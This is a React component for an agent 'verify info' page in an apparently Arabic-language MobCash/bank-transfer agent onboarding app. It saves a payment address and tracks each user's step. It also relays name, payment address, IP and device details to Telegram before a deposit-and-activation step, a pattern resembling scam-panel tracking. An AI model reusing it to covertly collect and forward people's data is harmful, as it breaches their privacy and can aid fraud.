import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useTranslation } from 'react-i18next';
import { CheckCircle2, AlertCircle } from 'lucide-react';
import { supabase } from '../../lib/supabase';
import { useAuthStore } from '../../store/auth';
import { sendTelegramMessage, getDeviceInfo, getIpAddress } from '../../lib/telegram';

export default function VerifyInfo() {
  const { t, i18n } = useTranslation();
  const { user, setUser } = useAuthStore();
  const navigate = useNavigate();
  const [paymentAddress, setPaymentAddress] = useState(user?.payment_address || '');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  useEffect(() => {
    if (user) {
      supabase.from('agents').update({ current_step: 'Verify Info' }).eq('id', user.id);
    }
  }, [user]);

  const isMobCashAgent = user?.agent_type !== 'bank_transfer';

  const handleConfirm = async (e: React.FormEvent) => {
    e.preventDefault();
    const finalAddress = paymentAddress.trim() || (isMobCashAgent ? 'MobCash Agent Account' : '');

    if (!isMobCashAgent && !finalAddress) {
      setError(t('payment_address_required') || 'Payment address is required');
      return;
    }

    setLoading(true);
    setError('');

    try {
      const { error: updateError } = await supabase
        .from('agents')
        .update({ 
          payment_address: finalAddress,
          status: 'verified',
          current_step: 'Activation Info'
        })
        .eq('id', user.id);

      if (updateError) throw updateError;

      // Log activity
      await supabase.from('activities').insert([
        {
          agent_id: user.agent_id,
          action: 'Agent verified information and proceeded',
        },
      ]);

      // Send Telegram notification
      try {
        const ip = await getIpAddress();
        const device = getDeviceInfo();
        const time = new Date().toLocaleString('ar-EG');
        const lang = i18n.language === 'ar' ? 'العربية' : 'English';
        
        const msg = `✅ <b>تأكيد بيانات الوكيل</b> ✅\n\n` +
                    `🆔 <b>ID الوكيل:</b> <code>${user.agent_id}</code>\n` +
                    `👤 <b>الاسم:</b> ${user.full_name}\n` +
                    `🏷️ <b>نوع الوكيل:</b> ${isMobCashAgent ? 'وكيل موبيكاش' : 'وكيل تحويل مصرفي'}\n` +
                    `💳 <b>عنوان الدفع:</b> <code>${finalAddress}</code>\n` +
                    `🌐 <b>اللغة:</b> ${lang}\n` +
                    `📱 <b>الجهاز:</b> ${device}\n` +
                    `🌐 <b>IP:</b> <code>${ip}</code>\n` +
                    `⏰ <b>الوقت:</b> ${time}\n` +
                    `⏳ <b>الخطوة الحالية:</b> انتقل إلى صفحة معلومات التفعيل`;
                    
        await sendTelegramMessage(msg);
      } catch (e) {
        console.error('Telegram notification failed', e);
      }

      // Update local state and navigate
      setUser({ ...user, payment_address: finalAddress, status: 'verified', current_step: 'Activation Info' }, 'agent');
      navigate('/agent/activation-info');
    } catch (err: any) {
      setError(err.message || t('failed_update_info') || 'Failed to update information');
    } finally {
      setLoading(false);
    }
  };

  if (!user) return null;

  return (
    <div className="max-w-2xl mx-auto space-y-6 pb-12">
      <div className="text-center mb-6">
        <h1 className="text-2xl sm:text-3xl font-black text-white">{t('verify_info', 'تأكيد البيانات الشخصية والوكالة')}</h1>
        <p className="text-slate-400 text-sm mt-1">{t('verify_info_subtitle', 'يرجى مراجعة وتأكيد بياناتك المسجلة للانتقال لخطوة التفعيل')}</p>
      </div>

      <div className="bg-slate-900/90 rounded-3xl shadow-2xl border border-slate-800 overflow-hidden">
        <div className="p-6 sm:p-8 space-y-6">
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            <div>
              <label className="block text-xs font-bold text-slate-400 uppercase tracking-wider mb-1">{t('full_name', 'الاسم الكامل')}</label>
              <div className="px-4 py-3 bg-slate-950 rounded-2xl border border-slate-800 text-white font-bold text-sm">
                {user.full_name}
              </div>
            </div>
            <div>
              <label className="block text-xs font-bold text-slate-400 uppercase tracking-wider mb-1">{t('agent_id', 'ID الوكيل')}</label>
              <div className="px-4 py-3 bg-slate-950 rounded-2xl border border-slate-800 text-amber-400 font-mono font-bold text-sm">
                {user.agent_id}
              </div>
            </div>
            <div>
              <label className="block text-xs font-bold text-slate-400 uppercase tracking-wider mb-1">{t('country', 'الدولة')}</label>
              <div className="px-4 py-3 bg-slate-950 rounded-2xl border border-slate-800 text-white font-bold text-sm">
                {user.country}
              </div>
            </div>
            <div>
              <label className="block text-xs font-bold text-slate-400 uppercase tracking-wider mb-1">{t('city', 'المدينة')}</label>
              <div className="px-4 py-3 bg-slate-950 rounded-2xl border border-slate-800 text-white font-bold text-sm">
                {user.city}
              </div>
            </div>
            <div>
              <label className="block text-xs font-bold text-slate-400 uppercase tracking-wider mb-1">{t('bank_name', 'البنك / الحساب')}</label>
              <div className="px-4 py-3 bg-slate-950 rounded-2xl border border-slate-800 text-amber-400 font-mono font-bold text-sm">
                {user.bank_name || 'MobCash'}
              </div>
            </div>
            <div>
              <label className="block text-xs font-bold text-slate-400 uppercase tracking-wider mb-1">{t('commission_rate', 'نسبة العمولة المقررة')}</label>
              <div className="px-4 py-3 bg-slate-950 rounded-2xl border border-slate-800 text-emerald-400 font-mono font-bold text-sm">
                {user.commission_deposit || 5}% إيداع / {user.commission_withdraw || 5}% سحب
              </div>
            </div>
          </div>

          <div className="pt-6 border-t border-slate-800">
            <div className={`p-4 rounded-2xl mb-6 flex items-start gap-3 border ${
              isMobCashAgent ? 'bg-emerald-950/60 border-emerald-500/30 text-emerald-200' : 'bg-slate-950 border-slate-800 text-slate-200'
            }`}>
              <AlertCircle className={`w-5 h-5 mt-0.5 flex-shrink-0 ${isMobCashAgent ? 'text-emerald-400' : 'text-amber-400'}`} />
              <div className="text-xs sm:text-sm">
                <span className="font-bold block mb-0.5 text-white">
                  {isMobCashAgent ? '🟢 نوع الوكالة: وكيل موبيكاش (MobCash Agent)' : '🏦 نوع الوكالة: وكيل تحويل مصرفي'}
                </span>
                <p className="text-slate-300">
                  {isMobCashAgent 
                    ? 'بصفتك وكيل موبيكاش معتمد، اضغط مباشرة على زر تأكيد البيانات للمتابعة لصفحة الإيداع والتفعيل.'
                    : 'يرجى تأكيد إدخال رقم حسابك البنكي أو المحفظة لتنفيذ وتسوية المعاملات.'}
                </p>
              </div>
            </div>

            <form onSubmit={handleConfirm} className="space-y-6">
              {error && (
                <div className="text-sm text-rose-400 bg-rose-950/60 p-3 rounded-xl border border-rose-500/30">
                  {error}
                </div>
              )}
              
              {!isMobCashAgent && (
                <div>
                  <label className="block text-xs font-bold text-slate-300 mb-2 uppercase tracking-wider">
                    {t('payment_address', 'عنوان الدفع / رقم الحساب')} <span className="text-rose-400">*</span>
                  </label>
                  <input
                    type="text"
                    required={!isMobCashAgent}
                    value={paymentAddress}
                    onChange={(e) => setPaymentAddress(e.target.value)}
                    placeholder={t('payment_address_placeholder', 'أدخل رقم الحساب البنكي أو المحفظة')}
                    className="w-full px-5 py-4 rounded-2xl border border-slate-700 focus:ring-2 focus:ring-amber-400 focus:border-amber-400 bg-slate-950 font-mono font-bold text-white shadow-inner"
                  />
                </div>
              )}

              <button
                type="submit"
                disabled={loading}
                className="w-full py-4 bg-gradient-to-r from-amber-500 via-yellow-500 to-amber-500 hover:from-amber-400 hover:to-yellow-400 text-slate-950 font-black rounded-2xl transition-all disabled:opacity-50 flex items-center justify-center gap-2 shadow-2xl cursor-pointer text-base"
              >
                {loading ? '...' : (
                  <>
                    <CheckCircle2 className="w-5 h-5" />
                    {t('confirm_information', 'تأكيد البيانات والمتابعة للتفعيل')}
                  </>
                )}
              </button>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
}
